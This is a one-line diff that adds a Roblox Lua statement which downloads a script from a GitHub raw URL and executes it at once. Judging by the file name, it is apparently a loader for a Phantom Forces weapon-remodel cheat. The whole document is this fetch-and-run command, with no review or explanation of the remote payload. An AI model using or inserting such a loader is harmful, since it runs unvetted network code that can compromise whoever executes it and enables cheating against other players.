@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/fall-weapon-remodels-phantom-forces-spam4-1q8mbmw0l5gwhc.lua"))()
